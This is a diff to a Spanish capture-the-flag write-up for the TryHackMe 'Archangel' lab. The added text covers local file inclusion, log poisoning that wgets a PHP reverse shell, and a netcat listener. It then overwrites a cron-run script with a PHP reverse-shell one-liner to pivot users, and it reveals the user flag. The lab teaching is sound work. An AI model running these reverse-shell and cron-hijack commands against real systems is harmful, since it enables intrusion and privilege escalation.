@@ -120,10 +120,26 @@ Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en 
 
 <code>http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//../%2fvar%2flog%2fapache2%2faccess.log&cmd=wget%20http://10.23.92.113:8000/php-reverse-shell.php</code>
 
-Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha en nuestra máquina el puerto '1234' con la herramienta **Netcat**.
+Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha, en nuestra máquina, el puerto '1234' con la herramienta **Netcat**.
+
+<code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/php-reverse-shell.php</code>
 
 <code>nc -lvnp 1234</code>
 
 ![Captura de pantalla 2025-04-25 135922](https://github.com/user-attachments/assets/d1328e57-dad6-48a6-bfe9-6b19c5fee614)
 
-**Flag:**
+Una vez realizado este *remote control execution* y obtenido el acceso (como usuario www-data), recupero un directorio que había observado anteriormente con *Burp Suite, que no es otro que '/etc/crontab'.
+
+<code>GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/crontab HTTP/1.1</code>
+
+Este directorio mostraba un *script* llamado 'helloworld.sh' que es ejecutado cada minuto por el usuario Archangel. Se comprueba que desde el usuario actual se puede modificar el contenido de este programa para ejecutar una nueva *reverse shell* que nos permita pivotar al usuario Archangel. Puesto que ya se ha comprobado que en la máquina se encuentra la herramienta de *php*, se utiliza esta para obtener el acceso al nuevo usuario con la ayuda de [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). De esta manera, se cambia el contenido de 'helloworld.sh' por lo siguiente. Además de volver a poner en escucha un puerto en la máquina anfitriona.
+
+<code>#!/bin/bash</code>
+
+<code>php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+
+![Captura de pantalla 2025-04-25 142151](https://github.com/user-attachments/assets/1c513e0d-7415-4c90-9ba3-88b8c725925f)
+
+Una vez obtenida la *shell* de Archangel, se encuentra la siguiente *flag* en el archivo /home/archangel/user.txt
+
+**Flag: thm{lf1_t0_rc3_1s_tr1cky}**
